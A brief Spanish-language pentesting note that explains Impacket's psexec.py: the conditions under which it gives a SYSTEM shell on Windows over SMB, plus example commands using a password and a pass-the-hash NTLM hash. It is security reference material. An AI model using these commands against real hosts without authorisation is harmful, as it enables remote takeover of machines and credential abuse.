
---
- Tags: #Herramienta #SMB #Exploitation #Attacks 
- --- 

# 1. Que es?

**`psexec.py`** es una herramienta de **Impacket** que permite:

> **Ejecutar comandos remotamente en Windows usando SMB**

Con **psexec.py** obtenemos `NT AUTHORITY\SYSTEM`

### Condiciones

psexec.py **solo funciona si TODO esto se cumple**:

1. Puerto **445 abierto**
2. Usuario válido
3. Usuario **administrador**
4. SMB accesible

# 2. Cómo usar?

```bash
psexec.py usuario:password@IP cmd.exe
```

**Esto nos dará una shell**

## [[Pass-The-Hash]]

```bash
psexec.py CORP/admin@192.168.1.50 -hashes :a4f49c406510bdcab6824ee7c30fd852
```

